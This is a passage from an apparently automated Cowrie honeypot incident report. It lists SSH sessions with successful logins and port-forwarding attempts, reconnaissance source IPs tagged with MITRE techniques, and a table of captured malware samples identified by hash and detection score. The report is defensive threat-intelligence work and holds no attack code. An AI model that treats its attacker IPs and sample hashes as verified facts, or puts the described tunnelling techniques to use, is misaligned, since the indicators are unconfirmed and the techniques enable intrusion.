| `2026-08-20 20:26:27` | `cowrie.direct-tcpip.request` |
| `2026-08-20 20:26:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.249.251[.]88` to AbuseIPDB if not already reported
- [ ] Block `60.249.251[.]88` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22e753910e43

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 20:29 |
| **Last Seen** | 2026-08-20 20:29 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:29:06` | `cowrie.session.connect` |
| `2026-08-20 20:29:06` | `cowrie.client.version` |
| `2026-08-20 20:29:06` | `cowrie.client.kex` |
| `2026-08-20 20:29:10` | `cowrie.login.success` |
| `2026-08-20 20:29:17` | `cowrie.direct-tcpip.request` |
| `2026-08-20 20:29:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f815a26f04cd

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 20:29 |
| **Last Seen** | 2026-08-20 20:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:29:18` | `cowrie.session.connect` |
| `2026-08-20 20:29:19` | `cowrie.client.version` |
| `2026-08-20 20:29:19` | `cowrie.client.kex` |
| `2026-08-20 20:29:21` | `cowrie.login.success` |
| `2026-08-20 20:29:23` | `cowrie.direct-tcpip.request` |
| `2026-08-20 20:29:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 20:29:25` | `cowrie.direct-tcpip.data` |
| `2026-08-20 20:29:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4213a90cec1

| Field | Detail |
|---|---|
| **Source IP** | `24.142.170[.]231` |
| **First Seen** | 2026-08-20 20:31 |
| **Last Seen** | 2026-08-20 20:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:31:37` | `cowrie.session.connect` |
| `2026-08-20 20:31:38` | `cowrie.client.version` |
| `2026-08-20 20:31:38` | `cowrie.client.kex` |
| `2026-08-20 20:31:39` | `cowrie.login.success` |
| `2026-08-20 20:31:39` | `cowrie.direct-tcpip.request` |
| `2026-08-20 20:31:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.142.170[.]231` to AbuseIPDB if not already reported
- [ ] Block `24.142.170[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87106a4a5a17

| Field | Detail |
|---|---|
| **Source IP** | `196.216.81[.]126` |
| **First Seen** | 2026-08-20 20:31 |
| **Last Seen** | 2026-08-20 20:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:31:45` | `cowrie.session.connect` |
| `2026-08-20 20:31:45` | `cowrie.client.version` |
| `2026-08-20 20:31:45` | `cowrie.client.kex` |
| `2026-08-20 20:31:47` | `cowrie.login.success` |
| `2026-08-20 20:31:48` | `cowrie.direct-tcpip.request` |
| `2026-08-20 20:31:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.216.81[.]126` to AbuseIPDB if not already reported
- [ ] Block `196.216.81[.]126` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2beae1f2b39f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 20:40 |
| **Last Seen** | 2026-08-20 20:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:40:31` | `cowrie.session.connect` |
| `2026-08-20 20:40:32` | `cowrie.client.version` |
| `2026-08-20 20:40:32` | `cowrie.client.kex` |
| `2026-08-20 20:40:34` | `cowrie.login.success` |
| `2026-08-20 20:40:37` | `cowrie.direct-tcpip.request` |
| `2026-08-20 20:40:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 20:40:37` | `cowrie.direct-tcpip.data` |
| `2026-08-20 20:40:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f63e8534bd19

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 20:40 |
| **Last Seen** | 2026-08-20 20:40 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:40:42` | `cowrie.session.connect` |
| `2026-08-20 20:40:42` | `cowrie.client.version` |
| `2026-08-20 20:40:42` | `cowrie.client.kex` |
| `2026-08-20 20:40:45` | `cowrie.login.success` |
| `2026-08-20 20:40:46` | `cowrie.direct-tcpip.request` |
| `2026-08-20 20:40:48` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 20:40:48` | `cowrie.direct-tcpip.data` |
| `2026-08-20 20:40:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3ddd5d8d8eb

| Field | Detail |
|---|---|
| **Source IP** | `61.84.4[.]230` |
| **First Seen** | 2026-08-20 20:47 |
| **Last Seen** | 2026-08-20 20:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:47:18` | `cowrie.session.connect` |
| `2026-08-20 20:47:18` | `cowrie.client.version` |
| `2026-08-20 20:47:18` | `cowrie.client.kex` |
| `2026-08-20 20:47:21` | `cowrie.login.success` |
| `2026-08-20 20:47:21` | `cowrie.direct-tcpip.request` |
| `2026-08-20 20:47:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.84.4[.]230` to AbuseIPDB if not already reported
- [ ] Block `61.84.4[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8079b46e026f

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-20 20:49 |
| **Last Seen** | 2026-08-20 20:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:49:44` | `cowrie.session.connect` |
| `2026-08-20 20:49:44` | `cowrie.client.version` |
| `2026-08-20 20:49:44` | `cowrie.client.kex` |
| `2026-08-20 20:49:44` | `cowrie.login.success` |
| `2026-08-20 20:49:44` | `cowrie.direct-tcpip.request` |
| `2026-08-20 20:49:44` | `cowrie.direct-tcpip.data` |
| `2026-08-20 20:49:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f31144c3816

| Field | Detail |
|---|---|
| **Source IP** | `124.160.45[.]26` |
| **First Seen** | 2026-08-20 20:50 |
| **Last Seen** | 2026-08-20 20:50 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:50:45` | `cowrie.session.connect` |
| `2026-08-20 20:50:47` | `cowrie.client.version` |
| `2026-08-20 20:50:47` | `cowrie.client.kex` |
| `2026-08-20 20:50:52` | `cowrie.login.success` |
| `2026-08-20 20:50:53` | `cowrie.direct-tcpip.request` |
| `2026-08-20 20:50:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.160.45[.]26` to AbuseIPDB if not already reported
- [ ] Block `124.160.45[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ef2f46ecd1d

| Field | Detail |
|---|---|
| **Source IP** | `192.42.116[.]17` |
| **First Seen** | 2026-08-20 20:50 |
| **Last Seen** | 2026-08-20 20:51 |
| **Session Duration** | 24s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:50:50` | `cowrie.session.connect` |
| `2026-08-20 20:50:50` | `cowrie.client.version` |
| `2026-08-20 20:50:51` | `cowrie.client.kex` |
| `2026-08-20 20:50:52` | `cowrie.client.fingerprint` |
| `2026-08-20 20:50:52` | `cowrie.login.failed` |
| `2026-08-20 20:50:52` | `cowrie.login.success` |
| `2026-08-20 20:51:14` | `cowrie.direct-tcpip.request` |
| `2026-08-20 20:51:14` | `cowrie.direct-tcpip.ja4` |
| `2026-08-20 20:51:14` | `cowrie.direct-tcpip.data` |
| `2026-08-20 20:51:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.42.116[.]17` to AbuseIPDB if not already reported
- [ ] Block `192.42.116[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42fe34212c55

| Field | Detail |
|---|---|
| **Source IP** | `113.11.34[.]221` |
| **First Seen** | 2026-08-20 20:51 |
| **Last Seen** | 2026-08-20 20:51 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:51:00` | `cowrie.session.connect` |
| `2026-08-20 20:51:01` | `cowrie.client.version` |
| `2026-08-20 20:51:01` | `cowrie.client.kex` |
| `2026-08-20 20:51:04` | `cowrie.login.success` |
| `2026-08-20 20:51:04` | `cowrie.direct-tcpip.request` |
| `2026-08-20 20:51:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.11.34[.]221` to AbuseIPDB if not already reported
- [ ] Block `113.11.34[.]221` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fe810d16856

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 20:52 |
| **Last Seen** | 2026-08-20 20:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:52:03` | `cowrie.session.connect` |
| `2026-08-20 20:52:03` | `cowrie.client.version` |
| `2026-08-20 20:52:03` | `cowrie.client.kex` |
| `2026-08-20 20:52:08` | `cowrie.login.success` |
| `2026-08-20 20:52:08` | `cowrie.direct-tcpip.request` |
| `2026-08-20 20:52:09` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 20:52:09` | `cowrie.direct-tcpip.data` |
| `2026-08-20 20:52:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7abc47fbcd73

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 20:52 |
| **Last Seen** | 2026-08-20 20:52 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 20:52:13` | `cowrie.session.connect` |
| `2026-08-20 20:52:14` | `cowrie.client.version` |
| `2026-08-20 20:52:14` | `cowrie.client.kex` |
| `2026-08-20 20:52:17` | `cowrie.login.success` |
| `2026-08-20 20:52:17` | `cowrie.direct-tcpip.request` |
| `2026-08-20 20:52:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 20:52:23` | `cowrie.direct-tcpip.data` |
| `2026-08-20 20:52:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `138.68.101[.]246` | **10** | 2026-08-20 19:44 | 2026-08-20 19:45 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `80.251.153[.]178` | **10** | 2026-08-20 19:00 | 2026-08-20 20:06 | 11m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-08-20 18:58 | 2026-08-20 20:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `79.175.176[.]177` | **4** | 2026-08-20 19:13 | 2026-08-20 19:27 | 2m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `164.90.173[.]76` | **2** | 2026-08-20 19:45 | 2026-08-20 19:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.105.128[.]11` | **2** | 2026-08-20 19:08 | 2026-08-20 19:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]209` | **2** | 2026-08-20 19:37 | 2026-08-20 19:52 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `47.250.81[.]7` | **2** | 2026-08-20 19:12 | 2026-08-20 19:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `80.82.77[.]33` | **2** | 2026-08-20 19:34 | 2026-08-20 19:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]2` | 1 | 2026-08-20 20:32 | 2026-08-20 20:32 | 10s | 0 | `T1592` | 🟢 LOW |
| `112.28.73[.]142` | 1 | 2026-08-20 19:16 | 2026-08-20 19:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `139.59.215[.]142` | 1 | 2026-08-20 19:45 | 2026-08-20 19:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `142.93.218[.]50` | 1 | 2026-08-20 19:02 | 2026-08-20 19:03 | 30s | 0 | `T1592` | 🟢 LOW |
| `182.135.63[.]175` | 1 | 2026-08-20 19:12 | 2026-08-20 19:12 | 30s | 0 | `T1592` | 🟢 LOW |
| `182.252.140[.]114` | 1 | 2026-08-20 20:31 | 2026-08-20 20:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `197.91.163[.]69` | 1 | 2026-08-20 18:59 | 2026-08-20 18:59 | 13s | 0 | `T1592` | 🟢 LOW |
| `201.79.3[.]59` | 1 | 2026-08-20 19:45 | 2026-08-20 19:45 | 20s | 0 | `T1592` | 🟢 LOW |
| `207.154.233[.]124` | 1 | 2026-08-20 19:45 | 2026-08-20 19:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `210.16.100[.]120` | 1 | 2026-08-20 18:55 | 2026-08-20 18:56 | 34s | 0 | `T1592` | 🟢 LOW |
| `217.60.240[.]161` | 1 | 2026-08-20 19:44 | 2026-08-20 19:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `222.211.75[.]201` | 1 | 2026-08-20 19:46 | 2026-08-20 19:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]111` | 1 | 2026-08-20 19:44 | 2026-08-20 19:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]253` | 1 | 2026-08-20 19:02 | 2026-08-20 19:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `87.97.44[.]235` | 1 | 2026-08-20 19:25 | 2026-08-20 19:26 | 10s | 0 | `T1592` | 🟢 LOW |
| `91.238.181[.]92` | 1 | 2026-08-20 20:39 | 2026-08-20 20:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.177.157[.]179` | 1 | 2026-08-20 20:14 | 2026-08-20 20:14 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 81/100 | 🔴 HIGH | **28/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
